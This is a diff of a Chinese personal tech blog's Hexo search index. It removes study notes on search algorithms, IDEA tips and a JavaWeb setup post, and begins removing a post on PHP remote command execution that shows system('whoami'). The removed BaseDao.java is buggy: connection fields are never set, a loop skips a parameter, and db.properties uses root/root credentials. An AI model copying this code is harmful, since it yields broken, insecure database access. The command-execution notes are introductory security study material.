@@ -97,6 +97,7 @@
 <p>会在md文件中会自动添加这一段</p>
 <p><img src="/images/pic-hexo/image-20211202174427901.png"></p>
 <p>然后在每次写文章时加上上面这句话,就能保证根目录正确了</p>
+<h4 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h4><p>这种方式还是很不稳定,最后采用了腾讯云COS+picgo+typora的方式</p>
 ]]></content>
       <categories>
         <category>hexo</category>
@@ -1065,149 +1066,6 @@
       </tags>
   </entry>
   <entry>
-    <title>查找</title>
-    <url>/2021/12/30/%E6%9F%A5%E6%89%BE/</url>
-    <content><![CDATA[<h4 id="ASL总结"><a href="#ASL总结" class="headerlink" title="ASL总结:"></a>ASL总结:</h4><p>无序表查找ASL:顺序查找ASL=(n+1)/2</p>
-<p>有序表折半查找ASL=log<sub>2</sub>(n+1)-1</p>
-<p>散列表上</p>
-<ul>
-<li>完全无冲突,ASL=1</li>
-<li>有冲突具体计算</li>
-</ul>
-<p>ASL取决于</p>
-<ol>
-<li>散列函数</li>
-<li>处理冲突的方法</li>
-<li>散列表的装填因子α</li>
-</ol>
-<p>α=表中填入的记录数/哈希表的长度</p>
-<p>α越大,表中记录数越多,说明表装得约满,发生冲突的可能性就越大,查找时比较次数就越多</p>
-<span id="more"></span>
-
-<h5 id="查找定义"><a href="#查找定义" class="headerlink" title="查找定义:"></a>查找定义:</h5><p>根据给定的某个值,在查找表中确定一个其关键字等于给定值的数据元素或记录</p>
-<h5 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h5><p>用来标识一个数据元素(或记录)的某个数据项的值</p>
-<p>主关键字: 可唯一的标识一个记录的关键字</p>
-<p>次关键字: 用以识别若干记录的关键字</p>
-<p>静态查找表:仅作”查询”操作的查找表</p>
-<p>动态查找表:作”插入”和”删除”操作的查找表</p>
-<h5 id="如何评价查找算法"><a href="#如何评价查找算法" class="headerlink" title="如何评价查找算法"></a>如何评价查找算法</h5><p>关键字的平均比较次数,也称<strong>平均查找长度ASL</strong></p>
-<img src="../images/%E6%9F%A5%E6%89%BE/image-20211230163613538.png" alt="image-20211230163613538" style="zoom:67%;" />
-
-<h3 id="顺序查找"><a href="#顺序查找" class="headerlink" title="顺序查找"></a>顺序查找</h3><p>优点:算法简单,逻辑次序无要求,且不同存储结构均适用</p>
-<p>缺点:ASL太大,<strong>ASL=(n+1)/2</strong></p>
-<p>时间复杂度O(n)</p>
-<h5 id="应用范围"><a href="#应用范围" class="headerlink" title="应用范围"></a>应用范围</h5><p>顺序表或线性链表表示的静态查找表</p>
-<p>表内元素之间无序</p>
-<h5 id="设置哨兵的顺序查找"><a href="#设置哨兵的顺序查找" class="headerlink" title="设置哨兵的顺序查找"></a>设置哨兵的顺序查找</h5><p>当数据元素特别大的时候，每次循环少进行一次越界判断，这样会节省几乎一般的时间。</p>
-<h5 id="记录的查找概率不相等时如何提高查找效率"><a href="#记录的查找概率不相等时如何提高查找效率" class="headerlink" title="记录的查找概率不相等时如何提高查找效率"></a>记录的查找概率不相等时如何提高查找效率</h5><p>按照查找概率高低存储</p>
-<h5 id="记录的查找概率无法测定时如何提高查找效率"><a href="#记录的查找概率无法测定时如何提高查找效率" class="headerlink" title="记录的查找概率无法测定时如何提高查找效率"></a>记录的查找概率无法测定时如何提高查找效率</h5><p>按查找概率动态调整记录顺序</p>
-<p>1)在每个记录中设一个访问频度域</p>
-<p>2)始终保持记录按非递增有序的次序排列</p>
-<p>3)每次查找后均将刚查到的记录直接移至表头</p>
-<h3 id="折半查找"><a href="#折半查找" class="headerlink" title="折半查找"></a>折半查找</h3><p>特点:每次将待查记录所在区间缩小一半</p>
-<p><strong>ASL=log<sub>2</sub>(n+1)-1</strong></p>
-<p>缺点:只适合有序表且仅限于顺序存储结构</p>
-<p>时间复杂度O(log<sub>2</sub>(n))</p>
-<p>mid=(low+high)/2</p>
-<p>key&lt;mid则:high=mid-1</p>
-<p>key&gt;mid则:low=mid+1</p>
-<p>key=mid,找到</p>
-<p>high&lt;low,结束,未找到</p>
-<p>判定树,按照查找次数和层数对应建树</p>
-<p>比较次数&lt;=树的深度</p>
-<p>满二叉树深度D=log<sub>2</sub>(n)+1</p>
-<p><img src="/images/%E6%9F%A5%E6%89%BE/image-20211230172538718.png" alt="image-20211230172538718"></p>
-<h3 id="分块查找"><a href="#分块查找" class="headerlink" title="分块查找"></a>分块查找</h3><p>优点:插入和删除比较容易,无需进行大量移动</p>
-<p>缺点:要增加一个索引表的存储空间并对厨师索引表进行排序运算</p>
-<p>适用情况:如果线性表既要快速查找又经常动态变化,则可采用分块查找</p>
-<p>步骤:</p>
-<p>1.将表分成几块,表或者有序,或者分块有序(第二块中所有元素值比第一块大)</p>
-<p>2.建立索引表</p>
-<h4 id="二叉排序树"><a href="#二叉排序树" class="headerlink" title="二叉排序树"></a>二叉排序树</h4><p>又称为二叉搜索树,二叉查找树</p>
-<p>二叉排序树或是空树,或是满足如下性质的二叉树:</p>
-<ul>
-<li>若其左子树非空,则左子树上所有结点的值均小于根节点的值</li>
-<li>若其右子树为空,则右子树上所有结点的值均大于等于根节点的值</li>
-<li>其左右子树本身又各是一棵二叉排序树</li>
-</ul>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">BStree <span class="title">SearchBST</span><span class="params">(BSTree T,KeyType key)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>((!T)||key==T-&gt;data.key) <span class="keyword">return</span> T;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(key&lt;T-&gt;data.key)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">SearchBST</span>(T-&gt;lchild,key);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="built_in">SearchBST</span>(T-&gt;rchild,key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>ASL</p>
-<p>二叉排序树每层各个结点的比较次数等于该层高度</p>
-<p>含有n个结点的二叉排序树的平均查找长度和树的形态有关</p>
-<p><strong>最好情况</strong>,形态比较均衡,ASL=log2(n+1)-1;</p>
-<p>O(log<sub>2</sub>(n))</p>
-<p><strong>最坏情况</strong>:,单支树,退化成顺序查找</p>
-<p>ASL=(n+1)/2</p>
-<p>O(n)</p>
-<p><strong>不同插入次序的序列生成不同形态的二叉排序树</strong></p>
-<p>二叉排序树—插入操作</p>
-<p>根据大小选择左右子树,找到某个叶子结点的左子树或者右子树为空,则插入节点为该叶子结点的左孩子或者右孩子</p>
-<p>二叉排序树—删除操作</p>
-<ul>
-<li><p>被删除的节点是叶子结点,直接删除即可</p>
-</li>
-<li><p>被删除的节点只有左子树或者只有右子树,用其左子树或者右子树替换它即可</p>
-</li>
-<li><p>被删除的节点既有左子树,也有右子树</p>
-</li>
-</ul>
-<p>用它中序遍历序列的前驱来代替它,前驱是左子树中最大的结点</p>
-<p>也可以用其后继替换之,后继是右子树中最小的结点</p>
-<h4 id="平衡二叉树"><a href="#平衡二叉树" class="headerlink" title="平衡二叉树"></a>平衡二叉树</h4><p>平衡二叉树又称AVL树,一棵平衡二叉树或者是空树,或者是具有下列性质的二叉排序树:</p>
-<ul>
-<li>左子树与右子树的高度之差的绝对值小于等于1</li>
-<li>左子树和右子树也是平衡二叉排序树</li>
-</ul>
-<p>平衡因子=结点左子树的高度-结点右子树的高度</p>
-<p><strong>对于一棵有n个结点的AVL树,其高度保持在O(log2(n))数量级,ASL也保持在O(log2(n))量级</strong></p>
-<p>失衡调整</p>
-<ul>
-<li>LL</li>
-<li>LR</li>
-<li>RL</li>
-<li>RR</li>
-</ul>
-<p>调整原则:自己慢慢分析,没必要背口诀</p>
-<ul>
-<li>降低高度</li>
-<li>保持二叉排序树性质(一般都是选取中等大小的节点上升)</li>
-<li>出现多个平衡因子绝对值相等的失衡节点,找最小的失衡子树进行调整</li>
-<li>失去父节点的子节点尽量更换到跟自己差值比较小的父节点</li>
-</ul>
-<p>根据所给序列建立平衡二叉树时,需要边插入边检查是否失衡,并进行调整</p>
-<h4 id="散列表查找"><a href="#散列表查找" class="headerlink" title="散列表查找"></a>散列表查找</h4><p>优点:查找效率高</p>
-<p>缺点:空间效率低</p>
-<p>散列表基本思想:记录的存储位置与关键字之间存在对应关系</p>
-<h5 id="冲突"><a href="#冲突" class="headerlink" title="冲突"></a>冲突</h5><p>不同关键字映射到同一个散列地址</p>
-<h5 id="好的散列函数应满足"><a href="#好的散列函数应满足" class="headerlink" title="好的散列函数应满足"></a>好的散列函数应满足</h5><ul>
-<li>所选函数尽可能简单,以便提高转换速度</li>
-<li>所选函数对关键码计算出的地址,应在整个地址区间中均匀分布,以减少空间浪费</li>
-</ul>
-<h5 id="一些常见方法"><a href="#一些常见方法" class="headerlink" title="一些常见方法"></a>一些常见方法</h5><p>​    1.直接定址法</p>
-<p>hash(key)=a key+b</p>
-<p>优点:以关键字的某个线性函数值为散列地址,不会产生冲突</p>
-<p>缺点:浪费空间</p>
-<p>​    2.除留余数法</p>
-<p>hash(key)=key mod p</p>
-<p><strong>选取p的技巧</strong></p>
-<p>设表长为m,取p&lt;=m且p为质数</p>
-<h3 id="常用解决冲突的方法"><a href="#常用解决冲突的方法" class="headerlink" title="常用解决冲突的方法"></a>常用解决冲突的方法</h3><h4 id="开放地址法"><a href="#开放地址法" class="headerlink" title="开放地址法"></a>开放地址法</h4><p>基本思想:有冲突的时候就去寻找下一个空的散列地址,只要散列表足够大,空的散列地址总能找到,并将数据元素存入</p>
-<p>例如:除留余数法 H<sub>i</sub>=(Hash(key)+d<sub>i</sub>)mod m,d<sub>i</sub>为增量序列</p>
-<p><strong>常用方法</strong></p>
-<p>α=表中填入的记录数/哈希表的长度</p>
-<p><img src="/images/%E6%9F%A5%E6%89%BE/image-20211231011652431.png" alt="image-20211231011652431"></p>
-<h5 id="线性探测法"><a href="#线性探测法" class="headerlink" title="线性探测法"></a>线性探测法</h5><p>增量序列d<sub>i</sub>为线性序列</p>
-<h5 id="二次探测法"><a href="#二次探测法" class="headerlink" title="二次探测法"></a>二次探测法</h5><p>增量序列d<sub>i</sub>为二次序列1²,(-1)², 2², (-2)²  ….  ,q² 二次序列</p>
-<h5 id="伪随机探测法"><a href="#伪随机探测法" class="headerlink" title="伪随机探测法"></a>伪随机探测法</h5><p>增量序列d<sub>i</sub>为伪随机数</p>
-<h4 id="再哈希法"><a href="#再哈希法" class="headerlink" title="再哈希法"></a>再哈希法</h4><h4 id="链地址法-拉链法"><a href="#链地址法-拉链法" class="headerlink" title="链地址法(拉链法)"></a>链地址法(拉链法)</h4><p><strong>优点:</strong></p>
-<p>1.非同义词不会冲突,无”聚集”现象</p>
-<p>2.链表上节点空间动态申请,更适合于表长不确定的情况</p>
-<p>基本思想:相同散列地址的记录链成一单链表</p>
-<p>m个散列地址就设m个单链表,然后用一个数组将m个单链表的表头指针存储起来,形成一个动态的结构</p>
-<h4 id="建立一个公共溢出区"><a href="#建立一个公共溢出区" class="headerlink" title="建立一个公共溢出区"></a>建立一个公共溢出区</h4>]]></content>
-  </entry>
-  <entry>
     <title>排序</title>
     <url>/2022/01/07/%E6%8E%92%E5%BA%8F/</url>
     <content><![CDATA[<h2 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h2><h4 id="排序的分类"><a href="#排序的分类" class="headerlink" title="排序的分类"></a>排序的分类</h4><h5 id="按照存储介质可以分为"><a href="#按照存储介质可以分为" class="headerlink" title="按照存储介质可以分为:"></a>按照存储介质可以分为:</h5><ul>
@@ -1436,7 +1294,7 @@
     <url>/2021/12/03/hexo%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%8A%80%E5%B7%A7/</url>
     <content><![CDATA[<h4 id="设置文章摘要"><a href="#设置文章摘要" class="headerlink" title="设置文章摘要"></a>设置文章摘要</h4><p>打开next配置文件</p>
 <p>将该项设置为true</p>
-<p><img src="/images/hexo%E8%AE%BE%E7%BD%AE%E6%96%87%E7%AB%A0%E6%98%BE%E7%A4%BA%E9%83%A8%E5%88%86%E5%86%85%E5%AE%B9/image-20211205134957202.png" alt="image-20211205134957202"></p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20211205134957202.png" alt="image-20211205134957202"></p>
 <p>显示文章摘要有两种方法</p>
 <p>1.在需要显示截断的地方添加<code>&lt;!--more--&gt;</code>标签</p>
 <p>2.在<code>front-matter</code>中添加<code>description</code>,<code>description</code>中的内容就会添加到首页上面,并且它的优先级高于<code>&lt;!--more--&gt;</code>标签</p>
@@ -2689,7 +2547,7 @@
   <entry>
     <title>cmd修改编码为utf-8</title>
     <url>/2021/01/13/cmd%E4%BF%AE%E6%94%B9%E7%BC%96%E7%A0%81%E4%B8%BAutf-8/</url>
-    <content><![CDATA[<h3 id="cmd修改编码为utf-8"><a href="#cmd修改编码为utf-8" class="headerlink" title="cmd修改编码为utf-8"></a>cmd修改编码为utf-8</h3><p>win+r输入regedit打开注册表</p>
+    <content><![CDATA[<h3 id="cmd修改编码为utf-8"><a href="#cmd修改编码为utf-8" class="headerlink" title="cmd修改编码为utf-8"></a>cmd修改编码为utf-8<span id="more"></span></h3><p>win+r输入regedit打开注册表</p>
 <p>找到对应位置添加aotorun值为chcp 65001 这样每次打开cmd都会自动运行chcp 65001更改为utf-8</p>
 <p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/Image1111.png" alt="Image"></p>
 ]]></content>
@@ -2704,7 +2562,7 @@
   <entry>
     <title>centos部署tomcat</title>
     <url>/2022/01/18/centos%E9%83%A8%E7%BD%B2tomcat/</url>
-    <content><![CDATA[<p>查看系统的位数,通过该命令就能查看</p>
+    <content><![CDATA[<p>查看系统的位数,通过该命令就能查看<span id="more"></span></p>
 <p><code>getconf LONG_BIT</code></p>
 <p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220119161624050.png" alt="image-20220119161624050"></p>
 <h4 id="安装JDK"><a href="#安装JDK" class="headerlink" title="安装JDK"></a>安装JDK</h4><p>下载jdk对应安装包linuxx64.tar.gz的</p>
@@ -2839,26 +2697,6 @@
       </tags>
   </entry>
   <entry>
-    <title>IDEA插件下载慢怎么解决</title>
-    <url>/2022/01/01/idea%E6%8F%92%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%85%A2%E6%80%8E%E4%B9%88%E8%A7%A3%E5%86%B3/</url>
-    <content><![CDATA[<p>想学习Javaweb,但是用的是社区版的idea,并不支持web开发,需要下载一个名叫Smart Tomcat的插件,下载要么很慢,要么失败,在网络上寻到一个很好用的方法,也可以适用于其他集成开发环境的插件下载</p>
-<p>首先用站长工具测试访问插件域名最快的节点<a href="http://tool.chinaz.com/speedtest">http://tool.chinaz.com/speedtest</a></p>
-<p>idea下载插件请求的域名是   plugins.jetbrains.com</p>
-<p>测试完成后找到一个延迟最低的最好和自己运营商一致的ip</p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220113154149803.png" alt="image-20220113154149803"></p>
-<p>然后打开hosts文件,修改域名和ip的对应关系</p>
-<p><code>C:\Windows\System32\drivers\etc\hosts</code></p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220113154237161.png" alt="image-20220113154237161"></p>
-]]></content>
-      <categories>
-        <category>小技巧</category>
-      </categories>
-      <tags>
-        <tag>插件下载</tag>
-        <tag>小技巧</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>hexo的一些使用技巧</title>
     <url>/2021/12/03/hexo%E7%9A%84%E4%B8%80%E4%BA%9B%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/</url>
     <content><![CDATA[<h5 id="配置文章摘要显示"><a href="#配置文章摘要显示" class="headerlink" title="配置文章摘要显示"></a>配置文章摘要显示</h5><p>打开next配置文件</p>
@@ -2874,19 +2712,6 @@
       </categories>
       <tags>
         <tag>hexo</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>IDEA快捷键总结</title>
-    <url>/2021/12/13/idea%E5%BF%AB%E6%8D%B7%E9%94%AE%E6%80%BB%E7%BB%93/</url>
-    <content><![CDATA[<p>ctrl+shift+alt：多行操作<br>psvm：生成main()方法；<br>fori：生成for循环；<br>Ctrl+Alt+v：自动补齐返回值类型<br>ctrl+o：覆写方法<br>ctrl+i：实现接口中的方法<br>ctrl+shift+u：大小写转换<br>CTRL+SHIFT+Z：取消撤销<br>Alt＋Insert：生成构造方法、getter、setter<br>ctrl+y：删除当前行<br>Ctrl+Shift+J：将选中的行合并成一行<br>ctrl+g：定位到某一行<br>Ctrl+Shitft+向下箭头：将光标所在的代码块向下整体移动<br>Ctrl+Shift+向上箭头：将光标所在的代码块向上整体移动<br>Alt+Shift+向下箭头：将行向下移动<br>Alt+Shift+向上箭头：将行向上移动<br>Ctrl+F：在当前文件中查找<br>Ctrl+R：替换字符串<br>Ctrl+Shift+F:在全局文件中查找字符串<br>Ctrl+Shift+R：在全局中替换字符串<br>Ctrl+Shift+Enter：自动补齐{}或者分号;<br>Shift+Enter：在当前行的下方开始新行<br>Ctrl+Alt+Enter：在当前行的上方插入新行<br>Ctrl+Delete：删除光标所在至单词结尾处的所有字符</p>
-]]></content>
-      <categories>
-        <category>小技巧</category>
-      </categories>
-      <tags>
-        <tag>IDEA</tag>
-        <tag>快捷键</tag>
       </tags>
   </entry>
   <entry>
@@ -3305,29 +3130,6 @@
       </tags>
   </entry>
   <entry>
-    <title>javaWeb项目搭建(subms)</title>
-    <url>/2022/01/17/javaWeb%E9%A1%B9%E7%9B%AE%E6%90%AD%E5%BB%BAsubms/</url>
-    <content><![CDATA[<h1 id="项目搭建–javaWeb"><a href="#项目搭建–javaWeb" class="headerlink" title="项目搭建–javaWeb"></a>项目搭建–javaWeb</h1><h4 id="1-配置一个maven-webapp项目"><a href="#1-配置一个maven-webapp项目" class="headerlink" title="1.配置一个maven webapp项目"></a>1.配置一个maven webapp项目</h4><h4 id="2-配置tomcat"><a href="#2-配置tomcat" class="headerlink" title="2.配置tomcat"></a>2.配置tomcat</h4><h4 id="3-测试项目是否能够跑起来"><a href="#3-测试项目是否能够跑起来" class="headerlink" title="3.测试项目是否能够跑起来"></a>3.测试项目是否能够跑起来</h4><h4 id="4-导入项目中可能会遇到的jar包"><a href="#4-导入项目中可能会遇到的jar包" class="headerlink" title="4.导入项目中可能会遇到的jar包"></a>4.导入项目中可能会遇到的jar包</h4><p>servlet,jsp,mysql-connector,standard….,记得maven同步一下</p>
-<h4 id="5-创建项目包结构"><a href="#5-创建项目包结构" class="headerlink" title="5.创建项目包结构"></a>5.创建项目包结构</h4><p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220117181550313.png" alt="image-20220117181550313"></p>
-<h4 id="6-编写实体类"><a href="#6-编写实体类" class="headerlink" title="6.编写实体类"></a>6.编写实体类</h4><p>ORM映射: 表—类映射</p>
-<h4 id="7-编写基础公共类"><a href="#7-编写基础公共类" class="headerlink" title="7.编写基础公共类"></a>7.编写基础公共类</h4><h5 id="数据库配置文件"><a href="#数据库配置文件" class="headerlink" title="数据库配置文件"></a>数据库配置文件</h5><figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">driver</span>=<span class="string">com.mysql.jdbc.Driver</span></span><br><span class="line"><span class="attr">url</span>=<span class="string">jdbc:mysql://localhost:3306/subms?useUnicode&amp;characterEncoding=utf-8</span></span><br><span class="line"><span class="attr">username</span>=<span class="string">root</span></span><br><span class="line"><span class="attr">password</span>=<span class="string">root</span></span><br></pre></td></tr></table></figure>
-
-<h5 id="编写数据库的公共类-BaseDao-java"><a href="#编写数据库的公共类-BaseDao-java" class="headerlink" title="编写数据库的公共类   BaseDao.java"></a>编写数据库的公共类   BaseDao.java</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.blue.dao;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.sql.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BaseDao</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String driver;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String url;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String username;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String password;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//静态代码块,类加载的时候就初始化了</span></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        Properties properties =<span class="keyword">new</span> Properties();</span><br><span class="line">        <span class="comment">//通过类加载器读取对应的资源</span></span><br><span class="line">        InputStream is=BaseDao.class.getClassLoader().getResourceAsStream(<span class="string">&quot;db.properties&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            properties.load(is);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        driver=properties.getProperty(<span class="string">&quot;driver&quot;</span>);</span><br><span class="line">        driver=properties.getProperty(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">        driver=properties.getProperty(<span class="string">&quot;password&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Connection <span class="title">getConnection</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Connection connection = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Class.forName(driver);</span><br><span class="line">            connection= DriverManager.getConnection(url,username,password);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> connection;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ResultSet <span class="title">execute</span><span class="params">(Connection connection,String sql,Object[] params,ResultSet resultSet)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">        PreparedStatement preparedStatement=connection.prepareStatement(sql);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;params.length;i++)&#123;</span><br><span class="line">            <span class="comment">//setObject方法不能从1开始,但是数组是从0开始</span></span><br><span class="line">            preparedStatement.setObject(i+<span class="number">1</span>,params[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        resultSet = preparedStatement.executeQuery(sql);</span><br><span class="line">        <span class="keyword">return</span> resultSet;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">execute</span><span class="params">(Connection connection,String sql,Object[] params,PreparedStatement preparedStatement)</span> <span class="keyword">throws</span> SQLException</span>&#123;</span><br><span class="line">        preparedStatement=connection.prepareStatement(sql);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;params.length;i++)&#123;</span><br><span class="line">            preparedStatement.setObject(i+<span class="number">1</span>,params[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> updateRows=preparedStatement.executeUpdate();</span><br><span class="line">        <span class="keyword">return</span> updateRows;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//释放资源</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">closeResource</span><span class="params">(Connection connection,PreparedStatement preparedStatement,ResultSet resultSet)</span></span>&#123;</span><br><span class="line">        <span class="keyword">boolean</span> flag=<span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">if</span>(resultSet!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                resultSet.close();</span><br><span class="line">                resultSet=<span class="keyword">null</span>;</span><br><span class="line">            &#125;<span class="keyword">catch</span> (SQLException e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">                flag=<span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(preparedStatement!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                preparedStatement.close();</span><br><span class="line">                preparedStatement=<span class="keyword">null</span>;</span><br><span class="line">            &#125;<span class="keyword">catch</span> (SQLException e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">                flag=<span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(connection!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                connection.close();</span><br><span class="line">                connection=<span class="keyword">null</span>;</span><br><span class="line">            &#125;<span class="keyword">catch</span> (SQLException e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">                flag=<span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h5 id="配置字符编码过滤器"><a href="#配置字符编码过滤器" class="headerlink" title="配置字符编码过滤器"></a>配置字符编码过滤器</h5><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>com.blue.filter.CharactorEncodingFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--过滤所有请求--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.blue.filter;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CharactorEncodingFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="comment">//filterChain:链的意思,一边出一边进,这样就可以使用多个过滤器串联起来</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        servletRequest.setCharacterEncoding(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">        servletResponse.setCharacterEncoding(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">        servletResponse.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line">        filterChain.doFilter(servletRequest, servletResponse);<span class="comment">//让请求继续走,不写程序就会在这里停止</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>java</category>
-      </categories>
-      <tags>
-        <tag>java</tag>
-        <tag>javaWeb</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>kali更新</title>
     <url>/2021/01/13/kali%E6%9B%B4%E6%96%B0/</url>
     <content><![CDATA[<p>kali更新依次使用即可更新前先更换源/etc/apt/sources.list</p>
@@ -3627,78 +3429,6 @@
         <tag>web</tag>
         <tag>文件包含</tag>
         <tag>php伪协议</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>rce</title>
-    <url>/2022/01/08/rce/</url>
-    <content><![CDATA[<h3 id="PHP常见的命令执行函数和运算符"><a href="#PHP常见的命令执行函数和运算符" class="headerlink" title="PHP常见的命令执行函数和运算符"></a>PHP常见的命令执行函数和运算符<span id="more"></span></h3><h5 id="1-system-函数"><a href="#1-system-函数" class="headerlink" title="1.system()函数"></a>1.system()函数</h5><p>用于执行外部程序,并且显示输出</p>
-<p>system(‘whoami’)</p>
-<p>root</p>
